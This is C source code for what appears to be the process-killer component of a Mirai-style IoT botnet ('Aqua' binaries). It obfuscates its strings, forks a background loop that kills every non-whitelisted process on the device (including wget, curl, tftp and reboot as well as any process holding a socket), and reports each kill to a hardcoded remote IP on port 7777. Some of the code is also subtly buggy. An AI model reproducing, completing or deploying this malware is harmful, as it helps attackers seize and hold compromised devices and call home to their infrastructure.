#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include <errno.h>
#include <sys/inotify.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/connector.h>
#include <linux/cn_proc.h>
#include <stdbool.h>


#include "headers/includes.h"
#include "headers/sysscan.h"
#include "headers/table.h"
#include "headers/util.h"
#include "headers/xor.h"

#define MAX_EVENTS 1024
#define EVENT_SIZE (sizeof(struct inotify_event))
#define BUF_LEN (MAX_EVENTS * (EVENT_SIZE + 16))

int locker_pid = -1;
int locker2_pid = -1;


static int locker_getpid(void)
{
    return locker_pid;
}
static int locker_getpid2(void)
{
    return locker2_pid;
}

typedef struct lock_t {
    int val;

    struct lock_t *prev, *next;
} Lock;

typedef struct killed_t {
    int pid;

    char realpath[256];

    struct killed_t *prev, *next;
} Kill;

#define RESCAN_LOOP_TIMES 4096

#define MAX_PATH_LENGTH 256

static Kill *kill_head = NULL;
static Lock *lock_head = NULL;

char *paths[] = {
    "/bin/busybox",
    "/usr/lib/systemd/systemd",
    "/usr/libexec/openssh/sftp-server",
    "/opt/app/monitor",
    "usr/",
    "mnt/",
    "sys/",
    "bin/",
    "boot/",
    "run/",
    "media/",
    "srv/",
    "sbin/",
    "lib/",
    "etc/",
    "dev/",
    "telnet",
    "ssh",
    "sshd"
    "bash",
    "httpd",
    "telnetd",
    "dropbear",
    "ropbear",
    "encoder",
    "system",
    "/z/secom/",
    "/usr/sbin/",
    "/usr/lib/",
    "Aqua.mpsl",
    "Aqua.mips",
    "Aqua.arm",
    "Aqua.arm",
    "Aqua.arm5",
    "Aqua.arm6",
    "Aqua.arm7",
    "Aqua.x86",
    "/var/tmp/wlancont",
    "wlancont"
};

static void append_list(Kill *info) {
    Kill *last = kill_head, *node = calloc(1, sizeof(Kill));

    node->pid = info->pid;
    strcpy(node->realpath, info->realpath);

    if(kill_head == NULL) { //if there are no items
        node->prev = NULL; //if this is the first structure we dont have a previous
        kill_head = node; //set header to our node because its the first

        return;
    }

    while(last->next != NULL) //go through the linked list to find the most recent structure added
        last = last->next;
    
    last->next = node;  //set the next one from our most recent to our new node
    node->prev = last;  //set the set our new nodes previous to the old most recent structure
}

static Kill *remove_list(Kill *del) {
    Kill *ret;

    if(kill_head == NULL || del == NULL) //dont wanna fuck with null shit
        return NULL;
    
    if(del == kill_head) { //if we are deleting our header structure
        kill_head = kill_head->next; //set our header structure to the structure after header

        kill_head->prev = NULL; //set the new header to null
    }
    else
        del->prev->next = del->next; //move the deleted nodes next one to the structure after
    
    free(del);

    ret = del->next; //return the new current node

    return ret;
}

Kill *search_list(char *realpath) {
    Kill *node = kill_head;

    while (node != NULL) {
        if(!strcmp(node->realpath, realpath))
            return node;

        node = node->next;
    }

    return NULL;
}

static char check_whitelist(char *self, char *realpath) {
    if(!strcmp(self, realpath))
        return 1;

    if(strstr(realpath, "/wget") ||
       strstr(realpath, "/tftp") || 
       strstr(realpath, "/curl") ||
       strstr(realpath, "/reboot"))
        return 0;

    int size = sizeof(paths)/sizeof(paths[0]);
    while(size--) {
        if(strstr(realpath, paths[size]))
            return 1;
    }

    return 0;
}

Lock *lock_append_list(int val) {
    Lock *last = lock_head, *node = calloc(1, sizeof(Lock));

    node->val = val;
    node->next = NULL;

    if(lock_head == NULL) {
        node->prev = NULL;
        lock_head = node;

        return lock_head;
    }

    while(last->next != NULL)
        last = last->next;
    
    last->next = node;
    node->prev = last;

    return node;
}

int lock_search_list(int val) {
    Lock *node = lock_head;

    while(node != NULL) {
        if(node->val == val)
             return 1;
        
        node = node->next;
    }

    return 0;
}

Lock *lock_remove_list(Lock *del) {
    Lock *ret;

    if(lock_head == NULL || del == NULL)
        return NULL;
    
    if(del == lock_head) {
        lock_head = lock_head->next;

        lock_head->prev = NULL;
    }
    else
        del->prev->next = del->next;
    
    free(del);

    ret = del->next;

    return ret;
}

int get_realpath(char *pid, char *rdbuf, int len) {
    char path[64];

    memset(rdbuf, 0, len);
    
    char enc_proc[] = {"2surf2"}; // /proc/
    
    util_encryption(enc_proc);
            
    strcpy(path, enc_proc);
    strcat(path, pid);
    strcat(path, "/exe");

    return readlink(path, rdbuf, len - 1);
} 

void remove_all() {
    Lock *last_node = lock_head;

    while(last_node->next != NULL)
        last_node = last_node->next;

    while(last_node->prev != NULL) {
        lock_remove_list(last_node);

        last_node = last_node->prev;
    }
}

Lock *scan(DIR *proc) {
    Lock *node;
    struct dirent *files;

    rewinddir(proc);

    if(lock_head != NULL)
        remove_all();

    while((files = readdir(proc))) {
        if(!util_isdigit(*(files->d_name)))
            continue;
        
        node = lock_append_list(atoi(files->d_name));
    }

    return node;
}
static char check_for_contraband(char *fdpath) {
    char fdinode[256] = {0};

    if (readlink(fdpath, fdinode, 256) == -1)
        return 0;
        
        char enc_proc[] = {"2surf2"}; // /proc/
        util_encryption(enc_proc);

    if (strstr(fdinode, "socket") || strstr(fdinode, enc_proc))
        return 1;

    return 0;
}

static char check_fds(char *pid, char *realpath) {
    char retval = 0;
    DIR *dir;
    struct dirent *file;
    char inode[256], fdspath[256] = {0}, fdpath[512];
    
    char enc_proc[] = {"2surf2"}; // /proc/
    util_encryption(enc_proc);

    strcpy(fdspath, enc_proc);
    strcat(fdspath, pid);
    strcat(fdspath, "/fd/");

    if ((dir = opendir(fdspath)) == NULL)
        return retval;

    while ((file = readdir(dir))) {
        memset(inode, 0, 256);

        strcpy(fdpath, fdspath);
        strcat(fdpath, file->d_name);

        if (check_for_contraband(fdpath)) {
            retval = 1;
            break;
        }
    }

    closedir(dir);
    return retval;
}

int create_socket(const char* ip_address, int port) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
       return;
    }

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip_address, &(server_addr.sin_addr)) <= 0) {
       return;
    }

    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
       return;
    }

    return sockfd;
}

void report_kill(int pid, const char* realpath) {
    char message[256];
    int sockfd = create_socket("146.19.191.205", 7777);
    snprintf(message, sizeof(message), "Killed process: PID=%d, Realpath=%s", pid, realpath);

    if (write(sockfd, message, strlen(message)) == -1) {
       return;
    }
}

void report_kill2(int pid, const char* realpath) {
    char message[256];
    int sockfd = create_socket("146.19.191.205", 7777);
    snprintf(message, sizeof(message), "cmd/maps Killed process: PID=%d, Realpath=%s", pid, realpath);

    if (write(sockfd, message, strlen(message)) == -1) {
       return;
    }
}

void killer_lol() {
    pid_t parent = fork();

    if (parent > 0) {
        // This is the parent process
        // Store the parent PID in a variable (e.g., locker2_pid)
        locker2_pid = parent;
        return;
    } else if (parent == -1) {
        // Fork failed
        return;
    }
    
    char enc_proc[] = {"2surf2"}; // /proc/
    util_encryption(enc_proc);

    DIR* proc = opendir(enc_proc);
    if (proc == NULL) {
        return;
    }

    // Create a socket and connect to the listener
    struct dirent* files;
    char path[64], rdbuf[256];

    Kill self;
    readlink("/proc/self/exe", self.realpath, sizeof(self.realpath));
    self.pid = getpid();

    int max_fd = dirfd(proc);
    fd_set read_fds;
    struct timeval timeout;

    while (1) {
        FD_ZERO(&read_fds);
        FD_SET(dirfd(proc), &read_fds);

        timeout.tv_sec = 0;
        timeout.tv_usec = 100000;  // 100 milliseconds

        int retval = select(max_fd + 1, &read_fds, NULL, NULL, &timeout);
        if (retval == -1) {
            // Handle select error
            break;
        } else if (retval == 0) {
            // Timeout occurred, no events
            usleep(6000);
            continue;
        }

        rewinddir(proc);
        while ((files = readdir(proc))) {
            if (!isdigit(*(files->d_name))) {
                continue;
            }

            memset(rdbuf, 0, sizeof(rdbuf));

            snprintf(path, sizeof(path), "/proc/%s/exe", files->d_name);
            if (readlink(path, rdbuf, sizeof(rdbuf)) == -1) {
                continue;
            }

            Kill* node = search_list(rdbuf);
            if (node != NULL) {
#ifdef DEBUG
                printf("[killer] found [%d] [%s] in kill list - killing [%s]\r\n", node->pid, node->realpath, files->d_name);
#endif
                kill(atoi(files->d_name), 9);

               // Report the kill to the listener
               report_kill(atoi(files->d_name), rdbuf);

                continue;
            }

            if (check_whitelist(self.realpath, rdbuf)) {
                continue;
            }
            dam_bot_she_gay();

            Kill info;
            info.pid = atoi(files->d_name);
            strcpy(info.realpath, rdbuf);
            append_list(&info);

#ifdef DEBUG
            printf("[killer] added [%d] [%s] to kill list\r\n", info.pid, info.realpath);
#endif

            kill(atoi(files->d_name), 9);

            // Report the kill to the listener
            report_kill(atoi(files->d_name), rdbuf);

            if (check_fds(files->d_name, info.realpath)) {
                append_list(&info);
#ifdef DEBUG
                printf("[killer] added [%d] [%s] to kill list FD\r\n", info.pid, info.realpath);
#endif
                kill(atoi(files->d_name), 9);

                // Report the kill to the listener
                report_kill(atoi(files->d_name), rdbuf);
            }
        }

        usleep(19000);
    }

    // Close the socket before exiting the child process
}
void killer_kill(void)
{
    if (locker_pid != -1)
    {
        kill(locker_pid, 9);
        locker_pid = -1;
    }
    if (locker2_pid != -1)
    {
        kill(locker2_pid, 9);
        locker2_pid = -1;
    }
}
